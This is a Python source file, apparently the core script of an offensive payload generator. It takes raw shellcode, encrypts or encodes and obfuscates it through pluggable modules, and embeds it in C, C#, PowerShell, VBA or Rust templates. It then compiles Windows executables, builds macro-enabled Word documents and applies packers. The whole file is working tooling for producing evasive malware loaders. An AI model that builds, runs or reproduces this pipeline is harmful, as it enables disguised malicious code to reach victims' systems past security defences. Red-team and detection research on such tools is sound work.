import argparse
import importlib
import importlib.util
import platform
import sys
import tempfile
import os
import shutil
import subprocess
import codecs
from vba.utils.inject import create_word_doc

def load_module(language: str, category: str, item: str) -> type:
    spec = importlib.util.spec_from_file_location(item, f'{language}/{category}/{item}.py')
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return getattr(module, item)

def parse_module_args(argument_string: str) -> tuple[str, dict]:
    split = str(argument_string).split(',')
    module = split[0]
    arguments = {}
    if (len(split) != 1):
        for item in split[1:]:
            splitItems = item.split('=')
            arguments[splitItems[0]] = splitItems[1]
    return module, arguments

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', "--transformers", type=str, nargs='*', required=False, help='Transformers encrypt or encode the shellcode and is decrypted or decoded at runtime.')
    parser.add_argument('-s', "--shellcode", type=str, required=True, help='Specifies the raw binary shellcode file')
    parser.add_argument('-t', "--template", type=str, required=True, help='Template that the shellcode and deobfuscation code will be placed into.')
    parser.add_argument('-l', "--language", type=str, choices={"c","cs","ps1","vba", "rs"}, required=True, help='Language used to write and compile')
    parser.add_argument('-f', "--obfuscator", type=str, required=False, help='Obfuscators transform the transformed shellcode bytes into other formats, such as strings.')
    parser.add_argument('-b', "--preprocessors", type=str, required=False, help='Preprocessors modify the shellcode but are self decoding.')
    parser.add_argument('-a', "--postprocessors", type=str, required=False, help='Postprocessors obfuscate the resulting exe or script, e.g. packers')
    parser.add_argument('-d', "--delivery", type=str, required=False, default="embedded", help='Delivery defines where the obfuscated shellcode is retrieved')
    parser.add_argument('-o', "--output", type=str, required=False, default="output", help='Output file name')
    args = parser.parse_args()

    shellcode = open(args.shellcode, 'rb').read()

    compilerOptions = []
    codeblocks = ''
    if args.language == 'cs':
        transformers = 'byte[] shellcode = {shellcode};'
    elif args.language == 'c':
        transformers = 'unsigned char *shellcode = {shellcode};'
    elif args.language == 'vba':
        transformers = 'shellcode = {shellcode}'
    elif args.language == 'ps1':
        transformers = '[Byte[]]$shellcode = {shellcode}'
    elif args.language == 'rs':
        transformers = 'let shellcode = {shellcode};'
    imports = []

    if args.preprocessors:
        preprocessorsList = args.preprocessors.split(',')
        for preprocessorItem in preprocessorsList:
            preprocessorObject = load_module(args.language, 'preprocessors', preprocessorItem)()
            shellcode = preprocessorObject.apply(shellcode)
            #shellcode = preprocessorFunction(shellcode)

    shellcodeSize = len(shellcode)

    if args.transformers:
        for transformer in args.transformers:
            transformersItem, arguments = parse_module_args(transformer)
            transformersObject = load_module(args.language, 'transformers', transformersItem)(arguments)
            transformedShellcode = transformersObject.encode(shellcode)
            codeblocks += transformersObject.codeblock()
            transformers = transformersObject.transformer(transformers)
            compilerOptions += transformersObject.compilerOptions()
            imports += transformersObject.imports()
            shellcode = transformedShellcode

    # Obfuscate shellcode
    if args.obfuscator:
        obfuscator, arguments = parse_module_args(args.obfuscator)
        obfuscatorObject = load_module(args.language, 'obfuscators', obfuscator)(arguments)
        obfuscatedShellcode = obfuscatorObject.obfuscate(shellcode)
        codeblocks += obfuscatorObject.codeblock()
        transformers = obfuscatorObject.transformer(transformers)
        imports += obfuscatorObject.imports()
        compilerOptions += obfuscatorObject.compilerOptions()
        shellcode = obfuscatedShellcode

    # Load template options
    templateObject = load_module(args.language, 'templates', args.template)()
    templateCode = templateObject.template()
    compilerOptions += templateObject.compilerOptions()
    imports = templateObject.imports() + imports


    deliveryItem, arguments = parse_module_args(args.delivery)
    print(parse_module_args(args.delivery))
    deliveryObject = load_module(args.language, 'delivery', deliveryItem)(shellcode, arguments)
    codeblocks += deliveryObject.codeblock()
    transformers = deliveryObject.transformer(transformers)
    imports += deliveryObject.imports()
    compilerOptions += deliveryObject.compilerOptions()

    # Remove duplicates while retaining order
    imports = '\n'.join(list(dict.fromkeys(imports)))

    # Write template to temporary file for compilation
    print(f'Writing source code to {args.output}.{args.language}')

    # Using emoji encode on a ps1 requires the utf-8 signature to be included in the file
    if args.language == 'ps1' and args.obfuscator == 'EmojiEncode':
        f = codecs.open(f'{args.output}.{args.language}', 'w', 'utf-8-sig')
    else:
        f = open(f'{args.output}.{args.language}', 'w')

    formattedCode = templateCode.format(imports=imports, shellcode='', codeblocks=codeblocks, transformers=transformers, shellcodeSize=shellcodeSize)
    f.write(formattedCode)
    f.close()
    print(f'Source code saved to {args.output}.{args.language}')

    # Compile file
    if args.language == 'c':
        outfile = f'{args.output}.exe'
        temp = ['x86_64-w64-mingw32-gcc', f'{args.output}.{args.language}', '-o', outfile, '-Wall'] + compilerOptions
        result = subprocess.run(['x86_64-w64-mingw32-gcc' , f'{args.output}.{args.language}', '-o', outfile, ] + compilerOptions, check=True)
        if result.returncode == 0:
            print(f'Payload saved to {outfile}')
    elif args.language == 'cs':
        if args.output.lower()[-4:] != '.exe':
            outfile = args.output + '.exe'
        else:
            outfile = args.output
        if platform.system() == 'Windows':
            result = subprocess.run(['C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe', f'{args.output}.{args.language}', f'-out:{outfile}'] + compilerOptions, check=True)
        elif platform.system() == 'Linux':
            result = subprocess.run(['mcs', f'{args.output}.{args.language}', f'-out:{outfile}'] + compilerOptions, check=True)
        if result.returncode == 0:
            print(f'Payload saved to {outfile}')
    elif args.language == 'vba':
        outfile = f'{args.output}.docm'
        result = create_word_doc(formattedCode, outfile)
        print(f'Macro saved to {outfile}')
    elif args.language == 'ps1':
        outfile = f'{args.output}.ps1'
    elif args.language == 'rs':
        if args.output.lower()[-4:] != '.exe':
            outfolder = args.output
            outfile = args.output + '.exe'
        else:
            outfolder = args.output[0:-4]
            outfile = args.output
        #shutil.rmtree(f'{outfolder}', ignore_errors=True)
        os.makedirs(f'{outfolder}/src/', exist_ok=True)
        open(f'{outfolder}/src/main.rs', 'w').write(formattedCode)
        open(f'{outfolder}/Cargo.toml', 'w').write(f"""
[package]
name = "{outfolder}"
version = "0.1.0"
edition = "2021"

[dependencies]
{'\n'.join(compilerOptions)}

[profile.release]
""")
        result = subprocess.run(['cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'], cwd=outfolder, check=True)
        shutil.copy(f'{outfolder}/target/x86_64-pc-windows-gnu/release/{outfile}', outfile)
        if result.returncode == 0:
            print(f'Payload saved to {outfile}')

    if args.postprocessors:
        postprocessorsList = args.postprocessors.split(',')
        for postprocessorItem in postprocessorsList:
            postprocessorObject = load_module(args.language, 'postprocessors', postprocessorItem)()
            postprocessorFunction = getattr(postprocessorObject, 'apply')
            postprocessorFunction(outfile)

if __name__ == "__main__":
    main()

